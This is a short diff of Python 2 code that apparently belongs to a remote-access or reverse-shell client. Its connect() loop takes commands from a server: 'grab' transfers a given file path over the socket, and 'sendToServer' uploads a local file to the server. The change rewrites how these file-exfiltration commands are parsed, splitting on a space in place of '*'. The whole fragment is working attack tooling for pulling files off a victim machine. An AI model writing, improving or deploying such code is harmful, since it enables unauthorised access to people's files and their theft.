@@ -179,7 +179,7 @@ def connect():
             break
 
         elif 'grab' in command:
-            grab, path = command.split("*")
+            grab, path = command.split(' ', 1)
             try:
                 transfer(s, path)
             except Exception, e:
@@ -187,7 +187,7 @@ def connect():
                 pass
 
         elif 'sendToServer' in command:
-            grab, path = command.split('*')
+            grab, path = command.split(' ', 1)
             if os.path.exists(path):
                 files = {'fileToUpload': open(path, 'rb')}
                 r = sendFile(files)
